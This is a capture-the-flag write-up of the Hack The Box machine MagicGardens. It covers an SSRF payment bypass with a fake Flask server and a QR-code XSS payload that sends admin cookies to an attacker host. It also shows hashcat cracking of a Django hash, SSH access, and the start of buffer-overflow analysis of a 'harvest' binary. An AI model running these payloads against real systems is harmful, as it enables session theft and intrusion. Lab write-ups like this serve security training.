![](images/Pasted%20image%2020241016192438.png)
![](images/Pasted%20image%2020241016192454.png)

#### 01 - Reconnaissance and Enumeration

Starting with Nmap to scan open ports and services.

```bash
# Nmap 7.94SVN scan initiated Wed Oct 16 19:31:07 2024 as: nmap -sCV -vv -Pn -p22,80,1337,5000 -oN nmap.txt 10.10.11.9
Nmap scan report for magicgardens.htb (10.10.11.9)
Host is up, received user-set (0.16s latency).
Scanned at 2024-10-16 19:31:08 IST for 66s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+EeX4lxNTcWYvgDh0dFVJlf0h9G0LwupXad6GDD9ct6lKEgELk3y0YuoNg/tOzn8t3TvhMsfAK2zB8dKfenM4=
|   256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYE2YyLpUp0IAWy3y5WUxFUEuF51LNMOevqPNzYKudU
80/tcp   open  http     syn-ack ttl 63 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Magic Gardens
|_http-server-header: nginx/1.22.1
|_http-favicon: Unknown favicon MD5: 2D4E563DC4B95F3EDDD2DA91D4ED426A
1337/tcp open  waste?   syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
|_    [x] Handshake error
5000/tcp open  ssl/http syn-ack ttl 62 Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-23T11:57:43
| Not valid after:  2024-05-22T11:57:43
| MD5:   2f97:8372:17ae:abe4:a4d9:5937:f438:3e71
| SHA-1: a6f9:ce07:c808:150a:00aa:f193:1b72:a963:f414:f57c
| -----BEGIN CERTIFICATE-----
| MIIFazCCA1OgAwIBAgIUDWhFdCp8MnPK7iV0Eqp2Tn4y5OQwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMzA1MjMxMTU3NDNaFw0yNDA1
| MjIxMTU3NDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
| HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
| AQUAA4ICDwAwggIKAoICAQDch9kz4icrrlZKg4blZD2CfpvP6Gj3SdJgywfEiJNu
| LX0Vxj1nxCNwcGuHsVXDIcHNfVjd8rS/zHrtUF70ONjXfWRPQo7jhEEV4+zTtXjz
| X4aoesPoYCD3fc7TSbLjWCJELKdtrdOxST0QMPkeQQYf37FARHvnGNAAKHEwL9mO
| EtvgRUvxKrUcKAB9XdAORZjzfSe67bedF47n7+CFx4imizS74dmXx99Kwgvb4JO3
| LrKlQR/K7lsqNAbykuPMxKrO2l1sVNMtxo5/BLkG2aTBMI12Mbr+dJ2C4LKGsSzj
| 2Z9vJR9EoOJCv5BzYmB2iCBe/6itnxFj+f1YJUDMA1j191O4gI9pp3K5hm9u5Avk
| kDhOgqfsaD02X/KFClnRnL3nY5GQAUw4HqLc3qgdf4DorD7hecEUehLhvYMDCBlq
| 0wdpwsOQCpQdJwg8fE+pyAciCpNc6tX73x5juhkyRaPg7okwMB9y0d1aN7601yCy
| TX0ITmMLP8WJUvRLTrmQWDDmg434gwc/GH8RoLyR12+B7731X07EXaA6nyNleMvg
| BV6X++MgItCuAQv4yVgfXJ49DL3n2SH66COElyr+L/m64gbuhsGjxNLIgELLKUkO
| 3lJbHTpqDzBGGo/C1/vYZE2gj7/JZPeDWm0otm1T3trKIHkGuSDqVcbe6Rm8xtGb
| 9QIDAQABo1MwUTAdBgNVHQ4EFgQUK9LKRtUE2IAKDDfGCrqB/hG1irMwHwYDVR0j
| BBgwFoAUK9LKRtUE2IAKDDfGCrqB/hG1irMwDwYDVR0TAQH/BAUwAwEB/zANBgkq
| hkiG9w0BAQsFAAOCAgEAM8+ImqdW9fT9jVE0XTGi0PmYM7bwXKWlJQU1NhzisuI2
| 7IzLsTH1HhysrMmksJu4/EdCMZdZFCpvPcZZqRzltJl0BW0Fcbl6YT12JCosbIRG
| GhhNKt/Pi/1/Gbx0e3WjzNHMN/3RN4ARFx5MxL6yImJDq7+Xr2FJNvUeQ4HyUEH0
| Qvz5PFhArLyUz3/NFqV4LxxyjxoLWyd8WXwFo71aq1GWLu9R/2RL+WPhN946TYlh
| p/iJV3SeemHIgRdWDGkXxRe6itp2zA/nkggxxy5TexbPY2z7VwAMqIizIKAEScFm
| t/cj12LxRswz2xicoNcC/nhoIxpZWh3qLfPh1W3gqMgAZvtPLDVQQvhNiJhJ2jPu
| D6SozctK1yA9uGkEFUEhOiNZ2X2vENiqJGggQsDQKDSrGS2sqZvKXoyNqcHQsUBI
| m5EZ6PQRgr4JMk2/JTqjpl2yN+EV7kfqrj5m6oiXmBOdg4osLse+7zLWUWSLwlic
| jrwMmoQsRbgKCA5+pB+CnKBVZjxKPw3qneqK3Gp2qVNf/yVKK0fFUhCYgRiqxfAz
| PhySBYrxEfqIqoMxCWIcnvvyil8rLJd4QEVAok5zZVIEohhlDhLZ60wnx2wNygA+
| s/nOcZJ2ylq6Lz7syIeAzG9YeLkFOuRtQXj8CuwhLcDPliLrrjJiwYmMYBpb7Z0=
|_-----END CERTIFICATE-----
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=10/16%Time=670FC72A%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\
SF:[x\]\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x
SF:20error\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPC
SF:Check,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"
SF:\[x\]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Ha
SF:ndshake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(T
SF:erminalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15
SF:,"\[x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Ha
SF:ndshake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0"
SF:)%r(LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,1
SF:5,"\[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshak
SF:e\x20error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")
SF:%r(NCP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Ha
SF:ndshake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%
SF:r(ms-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 16 19:32:14 2024 -- 1 IP address (1 host up) scanned in 66.86 seconds
```

Here 4 ports are open .

22 - `ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0).`
80 - `http     syn-ack ttl 63 nginx 1.22.1.`
1337 - `waste?   syn-ack ttl 63.`
5000 - `ssl/http syn-ack ttl 62 Docker Registry (API: 2.0).`

Here we have ssh and http open and waste service looks like nmap is not sure about this and we have port 5000 running Docker Registry API also open.

##### Enumerating Port 80

Visiting the web page we can see MagicGardens is a flower shopping site.
![](images/Pasted%20image%2020241016194032.png)
![](images/Pasted%20image%2020241016194057.png)

![](images/Pasted%20image%2020241016194248.png)

Here we will first create an account then logged in.

![](images/Pasted%20image%2020241016194637.png)

Burp Request we can see it passes `csrfmiddlewaretoken` , So we can say the Web Framework is `Djnago` here at least for now I can say that.

We also get our `dir` enumeration result and we found few interesting findings.

```bash
ffuf -u http://magicgardens.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt  
 :: Method           : GET
 :: URL              : http://magicgardens.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 165ms]
search                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
register                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 290ms]
login                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
profile                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1572ms]
logout                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1586ms]
cart                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 166ms]
catalog                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 187ms]
subscribe               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 184ms]
check                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 188ms]
restore                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 186ms]
wish_list               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 205ms]
send_message            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 185ms]
```

Lets now focus on our newly created account.

![](images/Pasted%20image%2020241016195046.png)

We see we have provided with some Functionalities.

- Personal Information - you are able to view details about the current user 
- Purchase history - you are able to see the purchases done 
- Messages - A chat room to send messages to existing users. 
- Subscription - Used to elevate (increase) the subscription

##### Subscription

Here its saying to fill details , Here we will it with random data and intercept the request.
![](images/Pasted%20image%2020241016195448.png)

![](images/Pasted%20image%2020241016195358.png)

Here we can see we get the bank name = `honestbank.htb` .

Now i am trying to get another Bank name by changing Bank types.

`magicalbank.htb` , `plunders.htb` and `honestbank.htb` We get the Bank name.

Now here we can see when we select the Bank name it is requesting the particular bank instead of Bank name lets try with out IP , maybe it request back to our Ip also.
![](images/Pasted%20image%2020241016195925.png)

Now looking back to our listener.

```bash
 nc -nvlp 8000       
listening on [any] 8000 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.9] 33832
POST /api/payments/ HTTP/1.1
Host: 10.10.14.88:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 128
Content-Type: application/json

{"cardname": "Mindflare", "cardnumber": "1111-2222-3333-4444", "expmonth": "Jan", "expyear": "2028", "cvv": "009", "amount": 25}
```

We see the details we want in a `JSON` format and it is sent to `/api/payments` inform of a POST request.

From above we see what is echoed back, cardname , cardnumber ; We can simply fake status: 200 and message = [Anything] . Let us create a Flask server to do this.

```python
#!/usr/bin/python3
# Modules for import
from flask import Flask, request, jsonify

# Variables
app = Flask(__name__)

# Routes for the application
@app.route("/api/payments/", methods=['POST'])
def SSRF_subscription():
    print(request)
    json_data = request.get_json()
    return jsonify({
        "status": "200",
        "message": "Payment processed successfully!",
        "cardname": json_data['cardname'],
        "cardnumber": json_data['cardnumber']
    })

if __name__ == '__main__':
    app.debug = True
    # We listen on all interfaces to avoid re-writing all the time
    app.run('0.0.0.0', 8000)
```

Now again fill the details and intercept the request and change the back name with our ip and port now run the flask server and intercept the request and forward it.

![](images/Pasted%20image%2020241016202518.png)

We can see it successfully send our success request now checking our browser we see ge successfully bypass subscription.

##### Understanding the Flow

1. **Target Application Behavior:** The target web application (e.g., `magicgardens.htb`) is using a payment endpoint (`/api/payments/`) to process payments. It expects a POST request containing payment details, such as card information, and responds based on the payment's success or failure.

2. **Controlling the Endpoint:** Since we can't directly manipulate the server at `magicgardens.htb`, we use Server-Side Request Forgery (SSRF) to trick the application into sending the request to our own server, where we control the response. By doing this, we can simulate a successful payment response.

3. **Setting Up a Fake Payment Server:** We created a Flask server to mimic the payment endpoint (`/api/payments/`). This server listens on a specified port and returns a "200" status code with a custom message (indicating payment success), regardless of the actual payment details received.

![](images/Pasted%20image%2020241016202715.png)

Now download the request and intercept the request at the same time.

```bash
GET /qr_code/images/serve-qr-code-image/?text=YjkzYjlhMmNhMWQ1MDViNWE0MWEyMzUyNTgzYTRmMjUuMGQzNDFiY2RjNjc0NmYxZDQ1MmIzZjRkZTMyMzU3YjkuTWluZGZsYXJl&cache_enabled=1&image_format=png&boost_error=1&encoding=utf-8&token=m.4..png.m.e7BKIQUJP6TREwUo1khs%3AHe2WIPYkh9my6vMDsphR0La92RYmWUN_0g8PbkeQGtI HTTP/1.1

Host: magicgardens.htb

Referer: http://magicgardens.htb/profile/?tab=subscription&action=success

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: csrftoken=OHhbcsSmRBuOhjzJJdJfEKeHCxEw06XB; sessionid=.eJxNjEsKwkAQRIPgJ5KDuPImguABQtuOpCEzgf6QleDGXS_b-zokG2tVRfHee_v9NGtecfIWgbUfSTS8Ce-WiZMVTRzDxg8miQvkFN5eqDyeI3DtO1FQk_D9lVMmy_WeSYbVVLluWX-io9i9B1SaSqVuhphEws4_yx82pg:1t15MK:v9jzonFvU7Kwp6_vJQNi8hbST8ZfLFuJB4nE2gqP7zU

Connection: keep-alive
```

- The endpoint `/qr_code/images/serve-qr-code-image/` appears to generate QR codes based on the `text` parameter provided in the URL.
- The `text` parameter could be some encoded data that the server decodes to generate the QR code.

If the server is simply encoding the provided text into a QR code without additional validation, there might be a way to forge a QR code that mimics a legitimate subscription confirmation.

Lets try that:

`Step 1` - Shop  a new item and buy it.
![](images/Pasted%20image%2020241016203506.png)

Here we can see we successfully buy it.

![](images/Pasted%20image%2020241016203542.png)

Here we get a message from user `morty` From above, we are able to see that Morty demands a QR code; we can be able to steal their cookies if they fetch information from the engraved QR code.

`Step-2` Download the qr code  and create a js file for cookie extraction.

```bash
cat exploit.js  
document.location = "http://10.10.14.88:8090/cookie?" + document.cookie;
```

Now read the QR codes and barcodes from images using `zbarimg`.

```bash
zbarimg qrcode.png

QR-Code:b93b9a2ca1d505b5a41a2352583a4f25.0d341bcdc6746f1d452b3f4de32357b9.Mindflare
scanned 1 barcode symbols from 1 images in 0.06 seconds
```


**Embed the Exploit in the QR Code:**

- We will create a new QR code that embeds the malicious JavaScript in the format of a URL or data that the application expects.

```bash
qrencode -o qrexploit.png "af2c383b847ea0f7593a928d75a5d509.0d341bcdc6746f1d452b3f4de32357b9.pyp5.<script src='http://10.10.14.88:8090/exploit.js'></script>"
```

Now run our python server and upload our `qrexploit.png`.

![](images/Pasted%20image%2020241016205543.png)

After uploading wait for some time we get our desired output:
![](images/Pasted%20image%2020241016210106.png)

```
csrftoken=x0ZFOidZX7ZKOMAnC9VqIOPN02j0WiK3

sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqp
yrCaG061amuuhcBC_gDes2X7:1t15xP:zFttnYv_3tMJk7Emye7Uqq_MEWYjbQO6AwG-xKGn6K0
```

Now just replace it with our current user now refresh , we will see we get our new user `morty` interface.
![](images/Pasted%20image%2020241016210232.png)

Now during our `dir` enumeration we see that an `/admin` endpoint for `Django administration` so let give a short by adding that endpoint here.
![](images/Pasted%20image%2020241016210600.png)

We hit the Bulls eye. Get Django Administrator.

Enumerate a little and we get hash password of the user `morty`.
![](images/Pasted%20image%2020241016210741.png)

`pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=`

```bash
nth --text 'pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I='

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=

Most Likely 
Django(PBKDF2-HMAC-SHA256), HC: 10000 JtR: django
```

Here the we get hash type now using hashcat or john crack the hash.

```bash
hashcat -m 10000 morty_hash /usr/share/wordlists/rockyou.txt

pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3Gj mmdzNU+Nl7I=:jonasbrothers
```

We can see our plaintext password: jonasbrothers

We acquire morty's password, we can try SSH:

```bash
ssh morty@10.10.11.9               
morty@10.10.11.9's password: 
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
morty@magicgardens:~$ id
uid=1001(morty) gid=1001(morty) groups=1001(morty)
morty@magicgardens:~$ 
```

### Privilege Escalation morty@magicgardens

```bash
morty@magicgardens:/home$ whoami
morty

morty@magicgardens:/home$ uname -a
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux

morty@magicgardens:/home$ sudo -l
-bash: sudo: command not found
morty@magicgardens:/home$ find / -type f -perm -04000 -ls 2>/dev/null
   394152     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   392513    640 -rwsr-xr-x   1 root     root         653888 Dec 19  2023 /usr/lib/openssh/ssh-keysign
   392967     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
   389506     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
   391769     72 -rwsr-xr-x   1 root     root          72000 Mar 28  2024 /usr/bin/su
   389509     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
   400498     36 -rwsr-xr-x   1 root     root          35128 Apr 18  2023 /usr/bin/fusermount3
   389410     60 -rwsr-xr-x   1 root     root          59704 Mar 28  2024 /usr/bin/mount
   389411     36 -rwsr-xr-x   1 root     root          35128 Mar 28  2024 /usr/bin/umount
   389505     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
   389508     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
   
morty@magicgardens:/home$ getcap -r / 2>/dev/null

morty@magicgardens:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

```bash
morty@magicgardens:/home$  cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
morty:x:1001:1001::/home/morty:/bin/bash
```

Here we can there is an another user named alex.

Here after a lot of enumeration i checked for the process running by alex user.

```bash
morty@magicgardens:~$ ps -ef | grep alex
alex        1790       1  0 02:10 ?        00:00:00 /lib/systemd/systemd --user
alex        1791    1790  0 02:10 ?        00:00:00 (sd-pam)
alex        1810       1  0 02:10 ?        00:00:00 harvest server -l /home/alex/.harvest_logs
morty      41557   26277  0 23:27 pts/0    00:00:00 grep alex
```

We have a `harvest binary` running from alex ; we can see if we can read it:

```bash
morty@magicgardens:~$ find / -name harvest 2>/dev/null
/usr/local/bin/harvest
```

Transfer this binary in our system to examine using scp:

```bash
scp morty@10.10.11.9:/usr/local/bin/harvest /home/mindflare/Desktop/HTB/MagicGarden
```

#### **Check Binary Information (Basic Checks)**

Using the `file` command to determine the type of binary:

```bash
file harvest

harvest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=13667f92f8314f1b726e07ce96dd2a4fad06df7f, for GNU/Linux 3.2.0, not stripped
```

The file `harvest` is identified as an ELF (Executable and Linkable Format) file.

Using `checksec` to check the security features enabled in the binary:

```bash
/env/bin/checksec --file=harvest

[*] '/home/mindflare/Desktop/HTB/MagicGarden/Harvest/harvest'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

- **Arch: amd64-64-little:** The architecture is 64-bit, using the Little Endian format, for the x86-64 instruction set.
    
- **RELRO: Partial RELRO:** "RELRO" (Relocation Read-Only) is a security feature that helps prevent some memory corruption attacks. Partial RELRO means that only the Global Offset Table (GOT) is read-only after being relocated, but other sections (such as the Procedure Linkage Table, or PLT) are still writable, making it less secure than Full RELRO.
    
- **Stack: No canary found:** - no need for brute force .Stack canaries are security mechanisms placed on the stack to detect buffer overflows. In this case, no stack canary is present, making the binary vulnerable to stack-based buffer overflow attacks.
    
- **NX: NX enabled:** The "NX" (No-eXecute) bit is enabled, which prevents certain memory areas, such as the stack, from being executed. This helps defend against some types of exploits that try to execute code from non-executable memory regions.
    
- **PIE: PIE enabled:** Position-Independent Executable (PIE) is enabled, which allows the program to be loaded at random memory addresses, increasing the effectiveness of Address Space Layout Randomization (ASLR).
    
- **Stripped: No:** The binary is not stripped, meaning it still contains symbol information (like function and variable names). This can make reverse engineering and debugging easier.
-
 Overall, the binary has some security features (NX, PIE), but also has weaknesses (Partial RELRO, no stack canary) that could be exploited if vulnerabilities are present.

Let us further analyze the binary:

```bash
ropper -f harvest --search 'pop'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: harvest
0x0000000000002237: pop r12; pop rbp; ret; 
0x00000000000012f3: pop rbp; ret; 
0x0000000000002236: pop rbx; pop r12; pop rbp; ret; 
0x0000000000001266: pop rsi; cmp eax, 0x85480000; sal byte ptr [rcx + rcx - 1], 0xe0; nop dword ptr [rax]; ret; 
0x0000000000002238: pop rsp; pop rbp; ret; 
```

```bash
ropper -f harvest --search 'jmp'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp

[INFO] File: harvest
0x0000000000001fba: jmp qword ptr [rsi + 0xf]; 
0x000000000000176d: jmp qword ptr [rsi - 0x77]; 
0x0000000000002287: jmp qword ptr [rsi - 0x7b]; 
0x000000000000126f: jmp rax;
```

We have some missing pop gadgets. Let us debug the file using ghidra:

![](images/Pasted%20image%2020241017094456.png)
From the above we can look at the main functions of the program. 

The program is split into two: 

- server functions ( harvest_server , harvest_listen , harvest_handshake_server )

- client functions ( harvest_client , harvest_connect , harvest_handshake_client ) 

We will look into the server functions first before the client.

#### Server functions

In this subsection, we view how the server works from the end of the binary (we will look into parts of the code, not all of it) The server operates in the following steps:
![](images/Pasted%20image%2020241017094712.png)

`sVar3 = write(param_1,local_58,sVar2);` The handshake written here.

In GDB we can break there and be able to observe the written values:

```
pwndbg> b *0x0000555555555f8b
Breakpoint 4 at 0x555555555f8b
pwndbg> c
Continuing.

Breakpoint 4, 0x0000555555555f8b in harvest_handshake_client ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────[ REGISTERS
/ show-flags off / show-compact-regs off 
]─────────────────────────────────────────────────────────────────
*RAX 0x3
RBX 0x7fffffffe2c8 —▸ 0x7fffffffe557 ◂— 
'/home/pyp/Misc/CTF/HTB/Machines/Active/MagicGardens/exploit/HarvestBinary/harvest'
*RCX 0x7fffffffe0e0 ◂— 'harvest v1.0.3\n'
*RDX 0xf
*RDI 0x7fffffffe0e0 ◂— 'harvest v1.0.3\n'
*RSI 0x7fffffffe0e0 ◂— 'harvest v1.0.3\n'

The RSI register contains the value that I need to send to the socket because the value is
being read and compared; If they match then the socket allows the connection.
It works as we are able to receive packets .
That client connection allows the server to print and log packets (if suspicious activity is
detected)

Looking at the log_packet function in ghidra :

└─$ nc 127.0.0.1 1337 
harvest v1.0.3
harvest v1.0.3
0--------------------------------------------------
Source: [18:55:0f:b2:89:ab] [208.113.128.254]
Dest: [9c:fc:e8:9b:fa:cd] [192.168.1.45]
Time: [20:13:58] Length: [65512]
------------------------------------------------

```

It works as we are able to receive packets . That client connection allows the server to print and log packets (if suspicious activity is detected)

I get the following logic:

- A buffer of size `32680` is initialized, but the actual size of the buffer is 32680 * 2 = `65360` ; this is due to the type of buffer it is `undefined2` meaning it holds 2 byte values for each element in the buffer . 

- It then copies `param2` into the buffer `local_38` which is `40 bytes` in size. (This buffer stores the filename where the packet is logged into it). We can rename it to `file_name` 

- It then does the following: `strncpy` copies the data from param_1 + 0x3c into the buffer local_ff88 , with the size of the uVar1 (which is the size of the param_1 + 4 ). We see a clear flaw in the logic of the function -> The size copied is dynamic (if we can send very large data, we can be able to overflow the buffer into the next buffer) 

- The `file_name` is opened and the data from the buffer is written there using the `fprintf` function.

We see that local_ff88 is directly above the next buffer, local_38 . Meaning if we overflow the buffer local_ff88 , we would write directly into the buffer containing file_name . Since the data written is the same in local_ff88 , we need to send a packet that triggers the log_packet function with something we want to write (our SSH key). This creates the following payload:

```bash
[SSH KEY] + content_padding + file_name + file_padding
```

Understand the following:

The buffer size is `65360 + 8` for `RBP register value` + `4` since the size that is read is +4 . In total the size of the buffer becomes `65372` . The first 12 byte are assumed to be the header of the packet, hence they are not read into the buffer local_ff88 . (This was tested using gdb ). 

The protocol that triggers suspicious activity is UDP in IPv6 mode. 

When we send data on the network it is logged if it is suspicious:

```python
#!/usr/bin/python3

# Import necessary module
import socket

# Constants
HOST = '::1'  # IPv6 loopback address (equivalent to 127.0.0.1 in IPv4)
PORT = 7777   # Port number
PACKET_PAYLOAD = b"This is a test for packet IPv6 UDP"  # Packet data

def main():
    """Main function to send a UDP packet."""
    
    # Print connecting message
    print("Connecting to the Socket...")
    
    # Define the server address
    server_address = (HOST, PORT)
    
    # Create a UDP socket
    with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
        # Connect to the server
        s.connect(server_address)
        print("Connected!")
        
        # Send the packet
        print("Sending some testing packets...")
        s.send(PACKET_PAYLOAD)
        print("Packet sent!")

# Entry point of the script
if __name__ == "__main__":
    main()
```

